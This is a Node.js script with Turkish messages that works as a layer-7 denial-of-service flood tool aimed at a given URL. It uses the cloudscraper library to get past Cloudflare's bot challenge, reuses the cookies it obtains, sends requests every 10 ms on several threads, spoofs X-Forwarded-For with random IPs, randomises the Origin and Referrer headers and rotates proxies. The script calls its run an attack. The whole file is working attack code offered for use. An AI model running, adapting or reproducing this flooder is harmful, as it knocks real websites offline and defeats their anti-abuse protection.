const cloudscraper = require('cloudscraper');
const request = require('request');
const args = process.argv.slice(2);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length <= 2) {
    console.log(`[Kullanım] node cf.js <url> <süre> <threads> [proxyListesi.txt]`);
    console.log(`[Örnek] node cf.js example.com 60 5 proxy.txt`);
    console.log(`[Uyarı] .edu .gov alanlarında kullanmayın`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
};

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
};

const url = process.argv[2];
const time = Number(process.argv[3]);
const threads = Number(process.argv[4]) || 1;
const proxyFile = process.argv[5] || null;

let proxyList = [];
if (proxyFile) {
    try {
        const fs = require('fs');
        const data = fs.readFileSync(proxyFile, 'utf8');
        proxyList = data.split('\n').filter(line => line.trim() !== '');
        console.log(`[Bilgi] ${proxyList.length} proxy yüklendi`);
    } catch (e) {
        console.log('[Hata] Proxy dosyası okunamadı, devam ediliyor...');
    }
}

console.log(`[Bilgi] ${time} saniye saldırı ${url} üzerine, ${threads} iş parçacığı, ${proxyList.length} proxy`);

for (let i = 0; i < threads; i++) {
    const int = setInterval(() => {
        // Proxy seçimi (döngüsel)
        let proxy = null;
        if (proxyList.length > 0) {
            const idx = Math.floor(Math.random() * proxyList.length);
            const p = proxyList[idx].split(':');
            if (p.length === 2) {
                proxy = {
                    host: p[0],
                    port: parseInt(p[1])
                };
            }
        }

        cloudscraper.get({
            url: url,
            proxy: proxy ? `http://${proxy.host}:${proxy.port}` : undefined,
            timeout: 5000
        }, function (e, r, b) {
            if (e) return;
            const cookie = r.request.headers.request.cookie;
            const useragent = r.request.headers['User-Agent'];
            const ip = rIp();
            const reqOpts = {
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip
                }
            };
            // Proxy ekle
            if (proxy) {
                reqOpts.proxy = `http://${proxy.host}:${proxy.port}`;
            }
            request(reqOpts);
        });
    }, 10); // 10ms aralık

    setTimeout(() => clearInterval(int), time * 1000);
  }
